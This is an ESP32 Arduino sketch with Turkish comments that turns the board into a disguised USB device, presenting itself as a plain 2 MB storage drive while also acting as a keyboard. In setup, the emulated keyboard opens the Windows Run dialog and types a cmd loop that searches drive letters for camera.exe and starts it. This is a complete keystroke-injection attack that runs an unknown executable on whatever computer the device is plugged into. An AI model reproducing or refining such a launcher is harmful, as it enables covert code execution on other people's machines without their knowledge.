#include "USB.h"
#include "USBMSC.h"
#include "USBHIDKeyboard.h"
#include "FFat.h"

USBMSC MSC;
USBHIDKeyboard Keyboard;

// Sanal disk boyutu (4096 blok * 512 bayt = 2 MB kalıcı disk alanı)
#define BLOCK_COUNT 4096
#define BLOCK_SIZE  512

File diskFile;

// Bilgisayar diskten veri okumak istediğinde Flash üzerindeki imaj dosyasından okur
int32_t onRead(uint32_t lba, uint32_t offset, void* buffer, uint32_t bufsize) {
  uint32_t pos = (lba * BLOCK_SIZE) + offset;
  if (!diskFile) return -1;
  diskFile.seek(pos);
  return diskFile.read((uint8_t*)buffer, bufsize);
}

// Bilgisayar diske dosya attığında Flash üzerindeki imaj dosyasına kalıcı olarak yazar
int32_t onWrite(uint32_t lba, uint32_t offset, uint8_t* buffer, uint32_t bufsize) {
  uint32_t pos = (lba * BLOCK_SIZE) + offset;
  if (!diskFile) return -1;
  diskFile.seek(pos);
  size_t written = diskFile.write(buffer, bufsize);
  diskFile.flush(); // Verinin flash hafızaya anında mühürlenmesini sağlar
  return written;
}

bool onStartStop(uint8_t power_condition, bool start, bool load_eject) {
  return true;
}

void setup() {
  // 1. Dâhili Flash hafızasındaki FATFS alanını başlatıyoruz
  if (!FFat.begin(true)) {
    return;
  }

  // 2. Eğer ilk kez çalışıyorsa Flash içinde 2MB'lık sanal disk dosyası (/disk.img) oluşturuyoruz
  if (!FFat.exists("/disk.img")) {
    diskFile = FFat.open("/disk.img", FILE_WRITE);
    if (diskFile) {
      uint8_t emptyBlock[BLOCK_SIZE];
      memset(emptyBlock, 0, BLOCK_SIZE);
      for (uint32_t i = 0; i < BLOCK_COUNT; i++) {
        diskFile.write(emptyBlock, BLOCK_SIZE);
      }
      diskFile.close();
    }
  }

  // Disk imaj dosyasını okuma/yazma modunda açık tutuyoruz
  diskFile = FFat.open("/disk.img", "r+");

  // 3. USB MSC (Mass Storage) ayarlarını bağla
  MSC.onRead(onRead);
  MSC.onWrite(onWrite);
  MSC.onStartStop(onStartStop);

  MSC.vendorID("ESP32");
  MSC.productID("USB Storage");
  MSC.productRevision("1.0");

  MSC.begin(BLOCK_COUNT, BLOCK_SIZE);
  MSC.mediaPresent(true);

  Keyboard.begin();
  USB.begin();

  // Sürücü ve klavyenin tanınması için bekleme
  delay(4000);

  // 4. Klavye dilini İngilizceye (US) çevir (Karakter kaymasını önlemek için)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(200);
  Keyboard.releaseAll();
  delay(1000);

  // 5. Windows + R (Çalıştır) aç
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();
  delay(800);

  // 6. Sürücüleri tarayıp camera.exe'yi çalıştıran hatasız komut
  Keyboard.println("cmd /c for %i in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist %i:\\camera.exe start %i:\\camera.exe");

  // 4. Klavye dilini geri Türkçe yap
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(500);
  Keyboard.releaseAll();
}

void loop() {
  // İşlem bir kez çalışır, döngü boştur.
}
